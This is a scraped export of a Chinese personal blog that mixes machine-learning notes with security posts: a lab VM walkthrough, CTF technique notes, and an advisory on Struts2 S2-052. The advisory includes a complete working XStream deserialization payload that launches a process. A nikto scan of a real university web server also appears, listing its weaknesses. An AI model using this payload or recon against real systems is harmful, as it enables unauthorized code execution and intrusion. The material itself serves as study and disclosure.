聚类分析指将物理或抽象对象的集合分组为由类似的对象组成的多个类的分析过程。 常用的分类算法包括： 而K均值(K-meansclustering)聚类则是最典型的聚类算法 除此之外，还有很多诸如 属于划分法K-MEDOIDS算法、CLARANS算法；属于层次法的BIRCH算法、CURE算法、CHAMELEON算法等；基于密度的方法：DBSCAN算法、OPTICS算法、DENCLUE算法等；基于网格的方法：STING算法、CLIQUE算法、WAVE-CLUSTER算法；基于模型的方法，本系列后续会介绍其中几种。 参考大神博客：http://blog.csdn.net/v_july_v/article/details/7577684 分类算法kNN K-邻近算法采用测量不同特征值之间的距离方法。进行分类。目标样本与存在标签的样本集作对比。 取前K个最为相似的数据，选择K最多的目标的新分类。 给定训练数据样本和标签，对于某测试的一个样本数据，选择距离其最近的k个训练样本，这k个训练样本中所属类别最多的类即为该测试样本的预测标签。简称kNN。 通常k是不大于20的整数，这里的距离一般是欧式距离。 一般流程 收集数据（距离计算所需要的数值，最好是结构化的数据格式） 分析数据：可以使用任何方法 训练算法：此步骤不适合K-邻近算法 测试算法：计算错误率 使用算法：输入样本数据+结构化输出结果 —》然后运行k-近邻算法判定输入数据属于哪个分类-=-》最后应用对计算出的分类执行后续操作。 决策树决策树学习采用的是自顶向下的递归方法，其基本思想是以信息熵为度量构造一棵熵值下降最快的树，到叶子节点处的熵值为零，此时每个叶节点中的实例都属于同一类。以树的形式划分数据集(ID3算法)。 一般流程 收集数据(树构造算法只适用于标称型数据、数据必须离散化) 分析数据：检查图形是否符合规范 训练算法:构造树的数据结构(ID3算法等等) 测试算法：使用经验树计算错误率 使用算法:此步骤可以适用于任何监督学习算法，而使用决策树可以更好的理解数据的内在含义。 朴素贝叶斯在给定目标值时属性之间相互条件独立的前提下，贝叶斯决策理论的核心思想：即选择具有最高概率的决策。 （基于条件概率） 一般流程 收集数据（需要数值型或者布尔型） 分析数据 训练算法：计算不同的独立特征的条件概率 测试算法：计算错误率 使用算法：文档分类居多 回归（预测）Logistic 回归最优化算法。 logistic函数根据现有的数据对于分类边界线建立回归公式。参考：https://www.zhihu.com/question/36714044?sort=created 一般流程 收集数据（需要进行距离计算，数值型，结构化数据最佳） 训练数据：大部分时间进行训练，训练的目的是为了找到最佳的分类回归系数。 测试数据 使用数据：输入数据–》结构化处理–》分类判定–》基于已经训练好的回归系数就可以对于这些数值进行简单的回归计算，判定它们属于哪个分类–》进一步处理 ​ support vector machine (SVM)支持向量机，因其英文名为support vector machine，故一般简称SVM，通俗来讲，它是一种二类分类模型，其基本模型定义为特征空间上的间隔最大的线性分类器，其学习策略便是间隔最大化，最终可转化为一个凸二次规划问题的求解。 参考：http://blog.csdn.net/v_july_v/article/details/7624837 https://www.zhihu.com/question/21094489https://zhuanlan.zhihu.com/p/21932911?refer=baina SVM通过核函数视图非线性的问题的数据集转变为核空间中一个线性可分的数据集。 神经网络是通过多个感知器(Perceptron)的组合叠加来解决非线性的分类问题。 神经网络CNN(卷积神经网络)CNN：https://www.zhihu.com/question/52668301 一般流程聚类算法# 隐马可夫模型(HMM)马可夫模型参考：https://www.zhihu.com/question/20962240 马尔可夫模型可以看做是一个转移弧上有概率的非确定的有限状态自动机。image 在上图中，圆圈表示状态，状态之间的转移用带箭头的弧表示，弧上的数字为状态转移的概率，初始状态用标记为start的输入箭头表示，假设任何状态都可作为终止状态。图中零概率的转移弧省略，且每个节点上所有发出弧的概率之和等于1。 隐马可夫模型(HMM)每个状态代表了一个可观察的事件，所以，马可夫模型有时又称作视马可夫模型(VMM)，这在某种程度上限制了模型的适应性。而在我们的隐马可夫模型(HMM)中，我们不知道模型所经过的状态序列，只知道状态的概率函数，也就是说，观察到的事件是状态的随机函数，因此改模型是一个双重的随机过程。其中，模型的状态转换是不可观察的，即隐蔽的，可观察事件的随机过程是隐蔽的状态过程的随机函数。 k-均值算法过程：Kmeans中文称为k-均值，步骤为： (1)它事先选定k个聚类中心，(2)然后看每个样本点距离那个聚类中心最近，则该样本就属于该聚类中心。(3)求每个聚类中心的样本的均值来替换该聚类中心(更新聚类中心)。(4)不断迭代(2)和(3), 直到收敛。","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"靶机渗透一","slug":"沙盒靶机渗透一","date":"2017-09-19T15:53:56.000Z","updated":"2018-03-30T00:40:27.501Z","comments":true,"path":"2017/09/19/沙盒靶机渗透一/","link":"","permalink":"https://shackles.top/2017/09/19/沙盒靶机渗透一/","excerpt":"","text":"1ip：192.168.1.106 //靶机ip nmap -sS -A 192.168.1.10612345678910111213141516171819root@shackle:~# nmap -sS -A 192.168.1.106Nmap scan report for 192.168.1.106Host is up (0.31s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 89:c2:ae:12:d6:c5:19:4e:68:4a:28:e9:06:bd:9c:19 (RSA)|_ 256 f0:0c:ae:37:10:d3:6d:a2:85:3a:77:04:06:94:f8:0a (ECDSA)80/tcp open http nginx|_http-server-header: nginx|_http-title: Welcome!514/tcp filtered shell3260/tcp open iscsi?|_iscsi-info: ERROR: Script execution failed (use -d to debug)Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 22 80 port,326 port 是iscsi的端口。参考：http://www.freebuf.com/articles/102500.htmlhttp://www.freebuf.com/articles/102500.htmlhttps://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/ iSCSI：Internet 小型计算机系统接口 （iSCSI：Internet Small Computer System Interface）。 1234iSCSI主要是透过TCP/IP的技术，将储存设备端透过iSCSI target (iSCSI目标端)功能，做成可以提供磁盘的服务器端，再透过iSCSI initiator (iSCSI初始化用户)功能，做成能够挂载使用iSCSI target的用户端，如此便能透过iSCSI设置来进行磁盘的应用了。也就是说，iSCSI 这个架构主要将储存装置与使用的主机分为两个部分，分别是： iSCSI target：就是储存设备端，存放磁盘或RAID的设备，目前也能够将Linux主机模拟成iSCSI target了！ 目的在提供其他主机使用的『磁盘』；iSCSI initiator：就是能够使用target的用户端，通常是服务器。 也就是说，想要连接到iSCSI target的服务器，也必须要安装iSCSI initiator的相关功能后才能够使用iSCSI target提供的磁盘。 dirb http://192.168.1.106 #扫目录1http://192.168.1.106/smblogin/custom-log/refer/del/arquivos/_archive/autodeploy/Links/pdf/portals/images3/forgotpassword/tuscany/send-password/catalog/tell_friend/queues/month/checking/mode/trap/affiliates/dba/program/font/index.html #### 123456789&gt;&gt;&gt; import base6&gt;&gt;&gt; a = &apos;SGVsbG8sIGlzIGl0IGZsYWdzIHlvdSdyZSBsb29raW5nIGZvcj8KSSBjYW4gc2VlIGl0IGluIHlvdXIgZXllcwpJIGNhbiBzZWUgaXQgaW4geW91ciBzbWlsZQpGbGFncyBhcmUgYWxsIEkndmUgZXZlciB3YW50ZWQgYW5kIG15IHBvcnRzIGFyZSBvcGVuIHdpZGUgCkNhdXNlIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBzYXkgYW5kIHlvdSBrbm93IGp1c3Qgd2hhdCB0byBkbwpBbmQgSSB3YW50IHRvIHRlbGwgeW91IHNvIG11Y2gsIG5vIGZsYWdzIGZvciB5b3UuLi4K&apos;&gt;&gt;&gt; print base64.b64decode(a)Hello, is it flags you&apos;re looking for?I can see it in your eyesI can see it in your smileFlags are all I&apos;ve ever wanted and my ports are open wide Cause you know just what to say and you know just what to doAnd I want to tell you so much, no flags for you... 12345678910111213141516root@shackle:~# nikto -h 192.168.1.106- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.106+ Target Hostname: 192.168.1.106+ Target Port: 80+ Start Time: 2017-09-19 22:27:41 (GMT8)---------------------------------------------------------------------------+ Server: nginx+ Server leaks inodes via ETags, header found with file /, fields: 0x58b7fa74 0x511 + The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)+ 7535 requests: 0 error(s) and 4 item(s) reported on remote host+ End Time: 2017-09-19 22:27:59 (GMT8) (18 seconds) 12345678root@shackle:~# iscsiadm -m discovery -t st -p 192.168.1.106:3260 #连接192.168.1.106:3260,1 iqn.2017-02.local.skuzzy:storage.sys0root@shackle:~# iscsiadm --m node -p 192.168.1.106 --login --target #登录iqn.2017-02.local.skuzzy:storage.sys0Logging in to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] (multiple)Login to [iface: default, target: iqn.2017-02.local.skuzzy:storage.sys0, portal: 192.168.1.106,3260] successful. 12345678910111213141516171819202122232425root@shackle:~# fdisk -lDisk /dev/sda: 60 GiB, 64424509440 bytes, 125829120 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: dosDisk identifier: 0x5acbe586Device Boot Start End Sectors Size Id Type/dev/sda1 * 2048 124780543 124778496 59.5G 83 Linux/dev/sda2 124782590 125827071 1044482 510M 5 Extended/dev/sda5 124782592 125827071 1044480 510M 82 Linux swap / SolarisDisk /dev/sdb: 1 GiB, 1073741824 bytes, 2097152 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesroot@shackle:~# mount /dev/sdb /mnt/ # 挂载root@shackle:~# cd /mnt/root@shackle:/mnt# cat flag1.txtCongratulations! You&apos;ve discovered the first flag!flag1&#123;c0abc15976b98a478150c900ebb0c86f0327f4dd&#125;Let&apos;s see how you go with the next one... - Nikto v2.1.6 Target IP: 210.44.112.115 Target Hostname: cs.lcu.edu.cn Target Port: 80 Start Time: 2017-09-19 23:44:55 (GMT8) Server: Apache Retrieved x-powered-by header: PHP/5.4.29 The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS Uncommon header ‘link’ found, with contents: http://cs.lcu.edu.cn/; rel=shortlink The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type Entry ‘/wp-admin/‘ in robots.txt returned a non-forbidden or redirect HTTP code (302) “robots.txt” contains 2 entries which should be manually viewed. Uncommon header ‘tcn’ found, with contents: list Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for ‘index’ were found: index.php Web Server returns a valid response with junk HTTP methods, this may cause false positives. Server leaks inodes via ETags, header found with file /sitemap.xml, fields: 0x0 0x4fc7e6798f940 OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. OSVDB-3092: /news: This might be interesting… /test/test.php: Output from the phpinfo() function was found. OSVDB-3233: /test/test.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. OSVDB-3092: /LICENSE.txt: License file found may identify site software. OSVDB-3092: /xmlrpc.php: xmlrpc.php was found. OSVDB-3092: /ci/: This might be interesting… potential country code (CÔte D’ivoire) /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin ‘Tested up to’ version usually matches the WordPress version /readme.html: This WordPress file reveals the installed version. /wp-links-opml.php: This WordPress script reveals the installed version. OSVDB-3092: /license.txt: License file found may identify site software. OSVDB-3092: /LICENSE.TXT: License file found may identify site software. Cookie wordpress_test_cookie created without the httponly flag /wp-login/: Admin login page/section found. /wordpress/: A Wordpress installation was found. 8369 requests: 0 error(s) and 28 item(s) reported on remote host End Time: 2017-09-20 00:59:39 (GMT8) (4484 seconds)","categories":[{"name":"blog","slug":"blog","permalink":"https://shackles.top/categories/blog/"}],"tags":[{"name":"渗透","slug":"渗透","permalink":"https://shackles.top/tags/渗透/"}]},{"title":"状态估计背景历史","slug":"姿势估计背景历史","date":"2017-09-15T15:53:56.000Z","updated":"2018-04-01T01:36:25.832Z","comments":true,"path":"2017/09/15/姿势估计背景历史/","link":"","permalink":"https://shackles.top/2017/09/15/姿势估计背景历史/","excerpt":"","text":"2015 年之前的方法都是回归出精确的关节点坐标( x,y )，采用这种方法不好的原因是人体运动灵活，模型可扩展性较差。 多人姿态估计的两种研究方法： 自顶向下(top-down)：先检测出多个人,再对每一个人进行姿态估计，可以将detection的方法加上单人姿态估计来实现； 自底向上(bottom-up)：先检测出关节点,再判断每一个关节点属于哪一个人。 基于cnn的多人姿态估计方法 多人估计方法一般分为两大类，即自顶向下和自底向上， 其中自顶向下是指先把人框出来，然后再用单人的方法去定位人的关节， 而自底向上的方法是先把所有关节位置弄出来，然后再区分关节属于谁。 二维图像姿态估计基于cnn的单人姿态估计方法 2014 deeppose 直接回归关节的坐标 ： 深度姿势直接回归关节的坐标 2015 flowconvnet 回归heatmap，间接得到坐标 ：使用卷积神经网络回归热图，间接得到坐标。 2016 很多方法了 CPM，hourglass， 以及一票改结构的方法 2017 依旧改结构，感觉很无趣，xiaogang组的wei wang和xiaochu基于hourglass改的一个网络目前是第一，91.5% 2016 mpii的deep cut和deeper cut 2017 partaffine field方法，cmu的，效果很赞。openpose。 一、 多人 ： 2D Pose estimation： \\1. open-Pose：（CVPR 2017 Oral, CMU） 性能：COCO: 61%MPII:75% 自下而上的方法 \\2. G-RMI (CVPR 2017 Google) 性能：COCO: 67% 3.Associative Embedding &lt;AssociativeEmbedding:End-to-End Learning for Joint Detection and Grouping&gt;(rejected by ICCV2017 , UMICH Jia Deng) 性能： COCO:66% MPII: 77% \\4. ( ICCV 2017, UCLA) 自下而上的方法 性能：PASCAL-Person-Part:62.8% \\5. (ICCV 2017, Facebook，Kaiming He） RCNN 性能：COCO: 63% \\6. &lt;RMPE: Regional Multi-Person Pose Estimation&gt;(ICCV 2017 , SJTU ,Tencent Youtu) 性能：COCO :61.8% MPII: 76% \\1. open-Pose：&lt;使用部分亲和场的实时多人2D姿态估计&gt;（CVPR 2017 Oral，CMU） 性能：COCO：61％MPII：75％ \\2. G-RMI&lt;朝向准确的多人姿势估计&gt;（CVPR 2017 Google） 性能：COCO：67％ 3.关联嵌入&lt;关联嵌入：联合检测和分组的端到端学习&gt;（由ICCV2017，UMICHJia Deng拒绝） 性能：COCO：66％MPII：77％ \\4. &lt;联合多人姿态估计和语义部分分割&gt;（ICCV 2017，UCLA） 性能：PASCAL-Person-Part：62.8％ \\5. （ICCV 2017，Facebook，开明和）RCNN 性能：COCO：63％ \\6. &lt;RMPE：区域多人姿态估计&gt;（ICCV 2017，上海交通大学，腾讯优图） 性能：COCO：61.8％MPII：76％ 二、3D Poseand Shape estimation \\7. SMPLify:3D Human Pose and Shape from a Single Image (ECCV 2016) \\8. A simplebaseline for 3d human pose estimation in tensorflow. To be presented at ICCV17. \\9. Coarse-to-Fine Volumetric Prediction forSingle-Image 3D Human Pose (CVPR),2017 其中： 1. Bottom-up approach 自下而上的方法： 先检测joints（关节）和 limbs（四肢），然后将他们group （组）成一个人。 代表文章 。 优点：整个图像只需要处理一遍，速度不随人数增加而变化； 2. Top-Down approach 自上而下的方法： 先检测单个人，再针对单个人做single-person poseestimation。 代表文章 先检测单个人，逐步对于每个进行 检测 优点：思路直观，自然，被绝大部分人所青睐，且单人估计精度非常高。 相关数据集/ 竞赛 MSCOCOKeypoint http://cocodataset.org/ MPII http://human-pose.mpi-inf.mpg.de/#results Posetrack https://posetrack.net/","categories":[],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"https://shackles.top/tags/机器学习/"}]},{"title":"车联网安全","slug":"车联网安全基础","date":"2017-09-09T15:53:56.000Z","updated":"2018-11-15T03:26:15.303Z","comments":true,"path":"2017/09/09/车联网安全基础/","link":"","permalink":"https://shackles.top/2017/09/09/车联网安全基础/","excerpt":"","text":"车联网安全基础 2017-08-02 车联网汽车现状：智能化 ，网联化，电动化 车载系统 安全现状 ： 车联网安全解决方案 终端 设计 ids 网络 车内部可信机制 车与智能手机 车网络服务 云服务 标准规范 车载网络 CSMA/CD 带冲突检测控制 CAN总线 主要测传输机制csma/cd CAN是控制器局域网络(Controller Area Network, CAN)的简称 一种通讯协议（类似TCP IP协议） 车载网络 C类网络 攻击思路： 录制重放 隔离重放 实时 man-in-the-middle ##手机卡 ​ HMI 与车内 网络软件操作系统的安全性、通讯安全、对于安全持续度量。 防御自动驾驶安全性问题 方程式 Al 内部攻击 传感信号伪造 自动驾驶以及车联网的整体安全架构 系统安全的设计 车通讯 车就是个内网重放 篡改 网络与系统防御与攻击 app加固 车联网安全 T-BOX（网络） CAN总线（控制汽车）","categories":[],"tags":[{"name":"物联网安全","slug":"物联网安全","permalink":"https://shackles.top/tags/物联网安全/"}]},{"title":"Struts2 远程代码执行漏洞S2-052","slug":"Struts2 远程代码执行漏洞S2-052","date":"2017-09-06T15:53:56.000Z","updated":"2018-03-29T23:22:30.424Z","comments":true,"path":"2017/09/06/Struts2 远程代码执行漏洞S2-052/","link":"","permalink":"https://shackles.top/2017/09/06/Struts2 远程代码执行漏洞S2-052/","excerpt":"","text":"Struts2 远程代码执行漏洞S2-052 2017-09-06 Struts2 远程代码执行漏洞 : S2-052Struts2 应用又曝出存在新的高危远程代码执行漏洞。该漏洞由lgtm.com的安全研究员汇报，编号为 CVE-2017-9805 ，漏洞危害程度为高危（Critical）。当用户使用带有 XStream 程序的 Struts REST 插件来处理 XML payloads 时，可能会遭到远程代码执行攻击。 前提：启用Strut REST 插件。 Struts 2.5 – Struts 2.5.12 版本 官方公告：https://cwiki.apache.org/confluence/display/WW/S2-052 漏洞编号：S2-052 CVE-2017-9805 S2-052概述Struts2 REST 插件使用带有 XStream 程序的 XStream Handler 进行未经任何代码过滤的反序列化操作，这可能在反序列化XML payloads时导致远程代码执行。任意攻击者都可以构造恶意的XML内容提升权限。 漏洞是由 Semmle 使用其开源分析工具 lgtm 及 QL 语言编写的 Java 反序列威胁查询检测而出的，详情可参考https://lgtm.com/blog/apache_struts_CVE-2017-9805 12345org.apache.struts2.rest.handler.AllowedClassesorg.apache.struts2.rest.handler.AllowedClassNamesorg.apache.struts2.rest.handler.XStreamPermissionProvider 漏洞POC123456789101112131415161718GET /struts2-rest-showcase/orders.xhtml HTTP/1.1Host: localhost:8080User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/xmlReferer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/editCookie: JSESSIONID=6FBA41434A908795E708AE545267C797; UM_distinctid=15e36471d10d0-09d67d334fbd0f8-49594234-100200-15e36471d11231; CNZZDATA1670348=cnzz_eid%3D1690420666-1504145890-%26ntime%3D1504329636Connection: closeIf-None-Match: 182927695Content-Length: 1647&lt;map&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;flags&gt;0&lt;/flags&gt; &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt; &lt;dataHandler&gt; &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt; &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt; &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt; &lt;initialized&gt;false&lt;/initialized&gt; &lt;opmode&gt;0&lt;/opmode&gt; &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt; &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt; &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt; &lt;command&gt; &lt;string&gt;C:\\Windows\\System32\\calc.exe&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;done&gt;false&lt;/done&gt; &lt;ostart&gt;0&lt;/ostart&gt; &lt;ofinish&gt;0&lt;/ofinish&gt; &lt;closed&gt;false&lt;/closed&gt; &lt;/is&gt; &lt;consumed&gt;false&lt;/consumed&gt; &lt;/dataSource&gt; &lt;transferFlavors/&gt; &lt;/dataHandler&gt; &lt;dataLen&gt;0&lt;/dataLen&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;entry&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt; &lt;/entry&gt; &lt;/map&gt; 效果如下：","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://shackles.top/tags/漏洞/"}]},{"title":"CTF-逆向 基础","slug":"CTF-逆向 基础","date":"2017-08-29T15:53:56.000Z","updated":"2018-11-14T13:10:59.675Z","comments":true,"path":"2017/08/29/CTF-逆向 基础/","link":"","permalink":"https://shackles.top/2017/08/29/CTF-逆向 基础/","excerpt":"","text":"CTF-逆向 基础 2017-08-07 https://www.gitbook.com/book/wizardforcel/re-for-beginners/details 逆向 ida 调试 安卓 native层 设置断点 设置程序 安卓附加上去，IDA F5调试 去除软件保护 侦壳 PEID Exelnfo （查看是什么壳） 脱壳 脱壳机 esp 定快速脱壳 去除花指令 OLLyDBG脚本 去除混淆 net 反混淆de4dot 定位验证代码 验证代码（算法） 正面驱动直入 从输入输出寻找 利用字符串找 CTF逆向常见算法 简单算法 简单异或 带雪崩的异或 加密算法（AES , RSA) 散列算法（MD5，SHA1) 解方程 有趣的算法 走迷宫 ..各种脑洞 经验加成 边信道攻击 Google 大法好 逆向trick xspy 应对MFC程序 手动加载signature 调试小技巧 CTF VS 现实 IDA高级使用 ​","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"CTF-Misc","slug":"ctf-misc","date":"2017-08-19T15:53:56.000Z","updated":"2018-05-23T12:04:21.432Z","comments":true,"path":"2017/08/19/ctf-misc/","link":"","permalink":"https://shackles.top/2017/08/19/ctf-misc/","excerpt":"","text":"CTF-Misc 2017-08-06 misc先上一些常用命令strings // 查找字符 foremost // 自动分离 binwalk // binwalk -e 自动提取 diff // 对比文件 pacpfix // pcap文件修复工具 DShell tshark // 命令行提取数据包 或者tcpdump Recon(信息收集)很少出现 Encode编码 各种进制 ​ 二进制转化为 123ASCII二维码图片 base家族 base64 32 16 曼彻斯特编码/差分曼彻斯特编码 二进制编码工具：JpocketKnife1.得到的二进制有可能7位一组，正常八位一组2.二维码：二进制串的长度是一个平方数3.因式分解其长度 base64编码方式： 字符对应ASCII转换成八位二进制 base64的基础单位是 38bit的二进制，若是不够38bit则在后面添加0字节（padding）直至满足 38bit的二进制转换成46bit的二进制 4*6bit的二进制转换成十进制 对照base64表把十进制转换成字符 解码方式: 检查base64编码后面有几个等于号 把字符串按照base64表转换成4*6的倍数位数二进制 删除等于号的个数*8的bit 按照6个bit一组转成字符 可以发现，编码和解码的方式并非完全对称的，解码的时候直接根据等号的数量删除bit,如果我们把数据写到填充的0的前两位，那么就可以实现隐写的功能。 判断方法: 先解码在编码，和原字符串对比，若不一样就是有隐写 www.atool.org(编码工具集) www.hackfun.org/CTF/coding-and-encryption-of-those-brain-holes-in-CTF.html(介绍CTF编码的文章) 图形码条形码,二维码。 Quoted printable用等号隔开 Brainfuckhttps://www.splitbrain.org/services/ook JSfuckhttp://www.jsfuck.com/可以直接扔到浏览器里运行 ####代码混淆明显，在线解码 工具小结http://tool.ph0en1x.com/hashtool/tools.html#convJPKCTFCrack Forensic &amp; Stego 取证对象：各种数据包PCAP,图像，音频，压缩包，磁盘，内存镜像，PDF,word 目的：发现文件隐藏的字符串，通常有文件的修复,字符串常常又与隐写加密结合在一起 &lt;&lt;黑客大追踪&gt;&gt; 熟悉常用文件的文件头。 Tools file strings diff binwalk,foremost binwalk -e拓展提高：http://www.freebuf.com/sectool/15266.html 010ditor分析文件16进制,强大的模板功能 图片：JPG特征：以 FF D8 开头，以 FF D9 结尾。格式：标记码+压缩数据标记码： 由两个字节构成，第一个字节是固定值0xFF，后一个字节则根据不同意义有不同数值压缩数据：前两个字节保存整个段的长度，包括这两个字节隐写方式：利用文件格式隐藏信息，插入法 文件尾部插入储存在APP1数据区中工具：MagicEXIF 每段开始前COM注释：FF 开始标记FE COM注释标记符00 02 总长度 11 内容工具:stegdetect 检测隐写工具 PNG特征：以89 50 4E 47 开头。格式:PNG文件署名域+标准数据块(+辅助数据块)隐写方式: IDAT 隐藏数据:PNG图片中可以存在多个IDAT块 因此这也成了一个隐写的途径 修改PNG图片的高度,隐藏数据 双图 ​ 工具:pngcheck ​ #####pngcheck LSB隐写stegsolve:必备 ​ 位平面对图像的影响不一样，可以隐写到不是很重要的位平面。 BMP 文件格式特征是以 50 4B 03 04 开头，有时也会出现 50 4B 05 06 和 50 4B 07 08 的情况。 GIF特征：以 GIF89a 或 GIF87a 开头。 文件格式 空间 时间轴 identity命令 //、linux上的identify命令主要用于获取一个或多个图像文件的格式和特性。 思路： 压缩文件：zip文件格式 压缩源文件数据区• 文件头 ： PK开头• 文件数据• （数据描述符） 思路： 文件格式 CRC32爆破：有时候加密的文件很小，直接枚举数据的CRC32值，如果相同，就相当于知道了文件的内容 伪加密 已知明文攻击 目录结束标识 RAR 文件特征：以以 Rar! 开头。 流量分析(重要) 文件修复 协议分析• 总体把握（整体分析） 协议分级 端点统计 • 过滤赛选 过滤语法 Host，Protocol，contains，特征值 • 发现异常 特殊字符串 协议某字段 • 数据提取 字符串取 文件提取 数据提取 Wireshark Pcapfix //修复数据包 Dshell(强大) tshark（wireshark命令行版本）命令:1. tr，2.xxd 其他音频文件 频谱有可能是在高频上，需要进行拉伸。(Rctf 2017) 波形 隐写软件：MP3Stego,Slienteye 视频类AVI，MP4较为常见 工具： Ffmpeg：BCTF2016-catvideo Ourstrect HTML隐写Snow.exe：通过插入制表位与空格使得嵌入的数据在浏览器中不可见http://fog.misty.com/perry/ccs/snow/snow/ PYC文件类字节码修复,隐写，逆向分析。 Tools pycdc uncompyle http://unpyc.sourceforge.net/Opcodes.html\\ Stegosaurus 隐写 12python3.6 stegosaurus.py 5061c764-2ac4-4386-afd0-2f7a69139efa.pyc -xExtracted payload: Flag&#123;HiD3_Pal0ad_1n_Python&#125; 1http://www.freebuf.com/sectool/129357.html 固件分析类（国内少）Pro类 Python模拟输入 爆破 算法 安卓逆向分析调试: IDA Pro GDB -angrHook: Xposed Frida（important） java层： java-&gt;jvm字节码-&gt;dalvik字节码(javac,dx) dex-&gt;smali(baksmaili) dex-&gt;smali,伪java(jeb) dex-&gt;java字节码(dex2jar) java字节码-&gt;伪java(jd-gui) native层:IDA 代码混淆C/C++源码混淆工具 LLVM-Obfuscator CXX-Obfuscator 混淆技术 指令替换 伪造控制流 扁平化控制流 隐藏与取证Rootkit取证技术","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://shackles.top/tags/CTF/"}]},{"title":"人体行为识别","slug":"行为识别","date":"2017-08-05T15:53:56.000Z","updated":"2018-11-15T03:15:03.951Z","comments":true,"path":"2017/08/05/行为识别/","link":"","permalink":"https://shackles.top/2017/08/05/行为识别/","excerpt":"","text":"人体行为识别空间复杂度，时间复杂度。 1）将人体动作行为识别划分为几个相互联系的子过程， 根据过程划分方式的不同对相应技术进行分析分类; 2) 典型问题方式，即选取人体动作行为识别中的部分典型问题作为对象，针对这些对象研究中涉及的方法进行分析分类;3) 空间时域方式， 即根据时域和空间上各项研究方法的差别对相应技术进行分析分类． 传统行为识别运动目标检测： 图像分割 基于区域的方法，基于边界的方法和数学形态学方法。其中， 基于区域的方法又分为阈值分割法，区域生长法和区域分裂合并法。 人体动作识别研究对于人体区进行分割 直接利用或结合图像分割法对于人体区域分割 构建人体模型–》结合图像分割方法通过人体区域进行分割 动作分割 